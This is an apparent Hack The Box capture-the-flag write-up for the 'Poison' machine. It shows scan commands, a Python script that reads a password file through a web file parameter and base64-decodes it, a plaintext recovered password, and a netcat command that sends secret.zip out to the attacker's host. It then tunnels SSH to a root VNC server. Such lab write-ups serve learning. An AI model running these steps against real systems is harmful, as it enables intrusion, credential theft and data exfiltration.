# Poison

Start with the usual `nmap` scan to figure out what ports are open. 

`nmap 10.10.10.84 -sC -sV -vvvv --top-ports 10000`

Looks like there is a webserver running, so lets `dirb` that isht and figure out what's on it!

`dirb http://10.10.10.84`

Found a file called `pwdbackup.txt` that was encoded 13 times in base64.

```
import base64
import requests
import re
import string
import paramiko

print "[*] Connecting to target..."

r = requests.get('http://10.10.10.84/browse.php?file=pwdbackup.txt')

full = r.text

blah = full.replace("This password is secure, it's encoded atleast 13 times.. what could go wrong really..", "")

print "[*] Stripping useless text from start of file..."

password = []

def decodeThings(n):
    return base64.b64decode(n)

if __name__ == '__main__':

    print "[*] Performing 13 base64 decodes..."

    for i in range(13):
        password = decodeThings(blah)
        blah = password

    print "[*] Password is: " + password

    # Use password to SSH into box and spawn a shell
    
    print "[*] Spawning SSH Session..."

```

That should do the job nicely for extracting the password from there. 

> Charix!2#4%6&8(0

Let's try using that with the `ssh` port we found.

`ssh charix@10.10.10.84`

And we're in!

`ls -la`

Hmmm

`cat user.txt`

Let's steal this `secret.zip` file as well.

`nc <myip> <port> < secret.zip` (on remote)

`nc -lvnp <port> > secret.zip`

We can open that using the password we found earlier!

`unzip secret.zip`

`cat secret`

Then we need to decode it.

`https://github.com/jeroennijhof/vncpwd` This will do nicely.

`gcc -o vncpwd vncpwd.c d3des.c`

`./vncpwn ../secret`

Now what?

`ps aux`

Hey, theres a vncserver running as root on this box...

`ssh -L 5900:127.0.0.1:5901 charix@10.10.10.84`

That will create an ssh tunnel to the box and will allow us to connect to its `vnc` server using our local machine (127.0.0.1)

`vncviewer` (enter server `127.0.0.1:5900` and the password that we got from decoding `secret.zip`)

Done, rooted! :) 